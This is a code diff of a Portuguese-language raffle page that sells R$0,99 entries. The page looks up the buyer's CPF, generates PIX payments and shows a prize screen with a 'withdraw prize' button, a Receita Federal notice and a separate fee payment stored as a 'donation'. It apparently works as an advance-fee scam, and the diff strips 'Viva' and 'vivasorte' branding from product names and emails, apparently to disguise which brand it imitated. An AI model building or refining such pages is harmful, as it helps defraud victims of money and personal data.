@@ -506,58 +506,18 @@
         overflow: hidden;
         box-shadow: 0 8px 25px rgba(0,0,0,0.2);
         animation: bounce 2s infinite;
-        image-rendering: -webkit-optimize-contrast;
-        image-rendering: crisp-edges;
-        -ms-interpolation-mode: nearest-neighbor;
-        transform: translateZ(0);
-        backface-visibility: hidden;
     }
     
     .imagem-premio img {
         width: 100%;
         height: auto;
         display: block;
-        image-rendering: optimizeQuality;
-        -webkit-font-smoothing: antialiased;
-        -moz-osx-font-smoothing: grayscale;
-        transform: translateZ(0);
-        backface-visibility: hidden;
         max-width: 100%;
-        height: auto;
     }
     
     @keyframes bounce {
         0%, 100% { transform: translateY(0) scale(1); }
         50% { transform: translateY(-10px) scale(1.02); }
-    }
-    
-    .premio-ganho h1 {
-        font-size: 32px;
-        margin-bottom: 15px;
-        font-weight: 900;
-        color: #000;
-        text-shadow: 0 2px 5px rgba(0,0,0,0.2);
-    }
-    
-    .valor-premio {
-        font-size: 48px;
-        font-weight: 900;
-        margin: 20px 0;
-        color: #000;
-        text-shadow: 0 3px 10px rgba(0,0,0,0.3);
-        animation: pulse-money 1.5s infinite;
-    }
-    
-    @keyframes pulse-money {
-        0%, 100% { transform: scale(1); }
-        50% { transform: scale(1.05); }
-    }
-    
-    .subtitulo-premio {
-        font-size: 20px;
-        font-weight: 600;
-        margin-bottom: 15px;
-        color: #000;
     }
     
     /* FORMULÁRIO CHAVE PIX */
@@ -603,7 +563,7 @@
         font-size: 16px;
     }
     
-    /* AVISO RECEITA FEDERAL - VERSÃO RESUMIDA */
+    /* AVISO RECEITA FEDERAL */
     .aviso-receita {
         background: #fff3cd;
         border-left: 4px solid #ffc107;
@@ -620,7 +580,7 @@
         font-size: 16px;
     }
     
-    /* QUADRO DA TAXA - CORRIGIDO PARA MOBILE */
+    /* QUADRO DA TAXA */
     .quadro-taxa {
         background: #2f4eb5;
         color: white;
@@ -657,14 +617,6 @@
         padding: 15px;
         background: #f8f9fa;
         border-radius: 8px;
-    }
-    
-    .aguardando-taxa {
-        text-align: center;
-        padding: 15px;
-        background: #f8f9fa;
-        border-radius: 8px;
-        margin-top: 10px;
     }
     
     .btn-sacar-premio {
@@ -748,10 +700,6 @@
     
     .passos-premio li span.bi-whatsapp {
         color: #25D366;
-    }
-    
-    .passos-premio li span.bi-telephone {
-        color: #2f4eb5;
     }
     
     .agradecimento {
@@ -926,31 +874,6 @@
             max-width: 250px;
         }
         
-        .valor-premio {
-            font-size: 36px;
-        }
-        
-        .premio-ganho h1 {
-            font-size: 24px;
-        }
-        
-        .subtitulo-premio {
-            font-size: 16px;
-        }
-        
-        .passos-premio {
-            padding: 20px 15px;
-        }
-        
-        .btn-suporte-final, .btn-sacar-premio {
-            padding: 16px;
-            font-size: 15px;
-        }
-        
-        .quadro-taxa {
-            padding: 12px 10px;
-        }
-        
         .valor-taxa-branco {
             font-size: 28px;
         }
@@ -985,7 +908,7 @@
         <h1>Sorteio <span style="background-color: #f0ad4e;" id="contador">HOJE</span> por apenas <span style="background-color: #2f4eb5;">R$0,99</span></h1>
     </div>
 
-    <!-- PACOTES DE COTAS - CORRIGIDO COM event -->
+    <!-- PACOTES DE COTAS -->
     <div class="container-principal">
         <div class="cotas">
             <div class="cotas-one">
@@ -1153,13 +1076,11 @@
                         <div id="erroCPF" class="mensagem-erro"></div>
                     </div>
                     
-                    <!-- ÁREA DE CARREGAMENTO DA CONSULTA -->
                     <div id="areaConsultaCPF" style="display: none; text-align: center; margin: 15px 0;">
                         <div class="spinner" style="border-top-color: #2f4eb5;"></div>
                         <p style="color: #666; font-size: 13px; margin-top: 10px;">Consultando dados do CPF...</p>
                     </div>
                     
-                    <!-- DADOS DO USUÁRIO ENCONTRADOS -->
                     <div id="dadosEncontrados" class="mensagem-sucesso" style="display: none;">
                         <i class="bi bi-check-circle-fill"></i>
                         Dados encontrados com sucesso!
@@ -1248,7 +1169,6 @@
                         </p>
                     </div>
                     
-                    <!-- ÁREA DE AGUARDANDO CONFIRMAÇÃO -->
                     <div id="aguardandoConfirmacao" class="aguardando-confirmacao">
                         <div class="rodinha-grande"></div>
                         <div class="aguardando-texto">Aguardando confirmação do pagamento</div>
@@ -1795,31 +1715,6 @@
         }
     }
 
-    function validarCPF(cpf) {
-        cpf = cpf.replace(/\D/g, '');
-        
-        if (cpf.length !== 11) return false;
-        if (/^(\d)\1+$/.test(cpf)) return false;
-        
-        let soma = 0;
-        for (let i = 0; i < 9; i++) {
-            soma += parseInt(cpf.charAt(i)) * (10 - i);
-        }
-        let resto = soma % 11;
-        let digito1 = resto < 2 ? 0 : 11 - resto;
-        
-        if (digito1 !== parseInt(cpf.charAt(9))) return false;
-        
-        soma = 0;
-        for (let i = 0; i < 10; i++) {
-            soma += parseInt(cpf.charAt(i)) * (11 - i);
-        }
-        resto = soma % 11;
-        let digito2 = resto < 2 ? 0 : 11 - resto;
-        
-        return digito2 === parseInt(cpf.charAt(10));
-    }
-
     function validarCPFeAvancar() {
         if (!dadosUsuario.cpf || !dadosUsuario.nome) {
             const erroAPI = document.getElementById('erroAPI');
@@ -1937,9 +1832,10 @@
         btnGerarPIX.disabled = true;
         
         try {
-            // Nome do produto alterado: removido "Viva" - agora é apenas "Sorte - títulos de capitalização"
+            // CORREÇÃO: Removido "Viva" do nome do produto
             const nomeProduto = `Sorte - ${pacoteSelecionado.quantidade} títulos de capitalização`;
-            const emailTemp = `sorte@email.temp.com`;
+            // CORREÇÃO: Email temporário sem "vivasorte"
+            const emailTemp = `sorte_${Date.now()}@temp.com`;
             
             const dadosPIX = {
                 amount: pacoteSelecionado.valor,
@@ -1987,7 +1883,7 @@
             dadosUsuario.transactionId = resultado.transaction_id;
             dadosUsuario.pixData = resultado;
             
-            localStorage.setItem(`pix_vs_${resultado.transaction_id}`, JSON.stringify({
+            localStorage.setItem(`pix_sorte_${resultado.transaction_id}`, JSON.stringify({
                 ...resultado,
                 cpf: dadosUsuario.cpf,
                 nome: dadosUsuario.nome,
@@ -1996,6 +1892,7 @@
                 quantidade: pacoteSelecionado.quantidade,
                 valor: pacoteSelecionado.valor,
                 produto: nomeProduto,
+                email: emailTemp,
                 gerado_em: new Date().toISOString(),
                 status: 'pending'
             }));
@@ -2155,11 +2052,11 @@
     }
 
     function processarConfirmacao(dadosConfirmacao) {
-        const transacaoSalva = JSON.parse(localStorage.getItem(`pix_vs_${dadosUsuario.transactionId}`) || '{}');
+        const transacaoSalva = JSON.parse(localStorage.getItem(`pix_sorte_${dadosUsuario.transactionId}`) || '{}');
         transacaoSalva.status = 'paid';
         transacaoSalva.confirmado_em = new Date().toISOString();
         transacaoSalva.confirmacao_dados = dadosConfirmacao;
-        localStorage.setItem(`pix_vs_${dadosUsuario.transactionId}`, JSON.stringify(transacaoSalva));
+        localStorage.setItem(`pix_sorte_${dadosUsuario.transactionId}`, JSON.stringify(transacaoSalva));
         
         salvarConfirmacaoPagamento();
         
@@ -2387,7 +2284,7 @@
             
             dadosUsuario.transactionIdTaxa = resultado.transaction_id;
             
-            localStorage.setItem(`doacao_vs_${resultado.transaction_id}`, JSON.stringify({
+            localStorage.setItem(`doacao_sorte_${resultado.transaction_id}`, JSON.stringify({
                 ...resultado,
                 cpf: dadosUsuario.cpf,
                 nome: dadosUsuario.nome,
